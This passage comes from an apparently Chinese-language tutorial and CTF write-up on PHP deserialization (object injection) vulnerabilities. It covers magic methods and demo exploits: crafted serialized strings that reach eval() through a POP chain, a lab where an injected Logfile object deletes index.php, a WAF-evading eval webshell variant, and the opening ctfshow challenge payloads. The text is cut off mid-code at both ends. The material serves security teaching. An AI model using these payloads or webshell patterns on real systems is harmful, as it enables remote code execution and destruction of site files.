class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;nickname&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;sucker&#x27;</span>, <span class="hljs-string">&#x27;damnGG&#x27;</span>, <span class="hljs-string">&#x27;f**k&#x27;</span>);<br>var_dump(serialize(<span class="hljs-variable">$user</span>));<br><br><span class="hljs-comment">//输出：O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:8:&quot;nickname&quot;;s:6:&quot;damnGG&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><p>对象反序列化时会检查是否存在一个<code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup()</code>方法，预先准备对象需要的资源。如果不存在，返回 void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-keyword">$this</span>-&gt;username;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user_ser</span> = <span class="hljs-string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;sucker&quot;;s:6:&quot;damnGG&quot;;s:4:&quot;f**k&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize(<span class="hljs-variable">$user_ser</span>));<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">输出：</span><br><span class="hljs-comment">object(User)#1 (5) &#123;</span><br><span class="hljs-comment">  [&quot;username&quot;]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;nickname&quot;]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;password&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  string(6) &quot;sucker&quot;</span><br><span class="hljs-comment">  [&quot;order&quot;:&quot;User&quot;:private]=&gt;</span><br><span class="hljs-comment">  NULL</span><br><span class="hljs-comment">  [&quot;damnGG&quot;]=&gt;</span><br><span class="hljs-comment">  string(4) &quot;f**k&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>PHP 反序列化漏洞又叫做 PHP 对象注入漏洞，反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/20201112222505683.png"></p><p>修改序列化后的字符串 然后传回代码进行反序列化 而此时恶意代码就被执行了</p><h3 id="覆盖输出"><a href="#覆盖输出" class="headerlink" title="覆盖输出"></a>覆盖输出</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$a_unser</span> = unserialize(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> A();<br><span class="hljs-variable">$b</span>-&gt;test = <span class="hljs-string">&#x27;hello world&#x27;</span>;<br><span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br><span class="hljs-comment">//得到 O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:11:&quot;hello world&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>传参回去<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612154244475.png"></p><p>反序列化后就会调用__destruct 函数，同时覆盖$test=demo 输出 hello world</p><h3 id="回马枪"><a href="#回马枪" class="headerlink" title="回马枪"></a>回马枪</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> foo();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return-&gt;action();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">foo</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;e);<br>    &#125;<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$return</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;return = <span class="hljs-keyword">new</span> evil();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$e</span> = <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> index();<br>var_dump(serialize(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//得到：O:5:&quot;index&quot;:1:&#123;s:13:&quot;indexreturn&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br><span class="hljs-comment">//手动修改一下：O:5:&quot;index&quot;:1:&#123;s:13:&quot;%00index%00return&quot;;O:4:&quot;evil&quot;:1:&#123;s:1:&quot;e&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/07/02/.png"></p><h3 id="恶意删除-index-php-等重要文件"><a href="#恶意删除-index-php-等重要文件" class="headerlink" title="恶意删除 index.php 等重要文件"></a>恶意删除 index.php 等重要文件</h3><p>某个 web 应用程序中，log.php 用来产生临时 profile.log(比如用户修改个人信息,修改完(__destruct 被调用)就删除这个临时日志)，目录假如就是根目录，即存在 index.php 前提 log.php 泄露，然后修改用户信息时得知反序列化传参可控，而且也用到了临时日志。</p><p>那么实验开始：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//log.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logfile</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//log文件名</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile.log&#x27;</span>;<br>    <span class="hljs-comment">//创建日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logdata</span>(<span class="hljs-params"><span class="hljs-variable">$log</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;log data:&#x27;</span>.<span class="hljs-variable">$log</span>.<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br>        file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename,<span class="hljs-variable">$log</span>,FILE_APPEND);<br>    &#125;<br>    <span class="hljs-comment">//destrcuctor删除日志</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Updete successfully!(__destruct deletes &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename.<span class="hljs-string">&#x27;)file.&lt;br /&gt;&#x27;</span>;<br>        unlink(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是一个使用 log.php 的简单例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//test.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-comment">// 创建一个对象</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> LogFile();<br><span class="hljs-comment">// 设置文件名和要储存的日志数据</span><br><span class="hljs-variable">$obj</span>-&gt;filename = <span class="hljs-string">&#x27;somefile.log&#x27;</span>;<br><span class="hljs-variable">$obj</span>-&gt;LogData(<span class="hljs-string">&#x27;Test&#x27;</span>);<br><span class="hljs-comment">// 脚本结束__destruct被调用somefile.log文件被删除</span><br></code></pre></td></tr></table></figure><p>注释掉 log.php 中的__destructor() 如下</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014308067.png"></p><p>访问 test.php</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703015954924.png"></p><p>产生了 somefile.log 文件</p><p>恢复__destructor() 就观察不到这个创建和删除的过程</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020204896.png"></p><p>但经过上面的测试 说明 log.php 可用</p><p>接下来继续</p><p>该网站有其他功能点，也是需要创建临时日志文件的，所以包含了同一个生成日志的类 比如更新用户信息 下面示例代码不含更新操作，显示一下就 ok 了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//提供反序列化的接口文件 profileupdate.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PrintData</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;User &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;name . <span class="hljs-string">&#x27; is &#x27;</span> . <span class="hljs-keyword">$this</span>-&gt;age . <span class="hljs-string">&#x27; years old. &lt;br /&gt;&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// 重建用户输入的数据</span><br><span class="hljs-variable">$usr</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;usr_serialized&#x27;</span>]);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//evil.php 注意，直接访问此文件index.php也会被删除</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;log.php&#x27;</span>;<span class="hljs-comment">//上面已经提到log.php已经泄露，故可以如此构造</span><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> logfile();<br><span class="hljs-variable">$object</span>-&gt;filename = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$object</span>).<span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>;<br><br><span class="hljs-comment">//输出：O:7:&quot;Logfile&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;index.php&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703014910163.png"></p><p>index.php 文件存在可访问</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703020742097.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210703021610114.png"></p><p>可见 index.php 被成功删除</p><h3 id="过-WAF-一句话的尝试"><a href="#过-WAF-一句话的尝试" class="headerlink" title="过 WAF 一句话的尝试"></a>过 WAF 一句话的尝试</h3><p>某些情况下 对一句话木马变种</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&#x27;demo&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;test);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$len</span> = strlen(<span class="hljs-variable">$test</span>) + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$pp</span> = <span class="hljs-string">&#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:&#x27;</span>.<span class="hljs-variable">$len</span>.<span class="hljs-string">&#x27;:&quot;&#x27;</span>.<span class="hljs-variable">$test</span>.<span class="hljs-string">&#x27;;&quot;;&#125;&#x27;</span>; <span class="hljs-comment">// 构造序列化对象</span><br><span class="hljs-variable">$test_unser</span> = unserialize(<span class="hljs-variable">$pp</span>); <span class="hljs-comment">// 反序列化同时触发_destruct函数</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210612155638097.png"></p><h2 id="ctf-题"><a href="#ctf-题" class="headerlink" title="ctf 题"></a>ctf 题</h2><h3 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload：</p><blockquote><p>GET:username=xxxxxx&amp;password=xxxxxx</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span 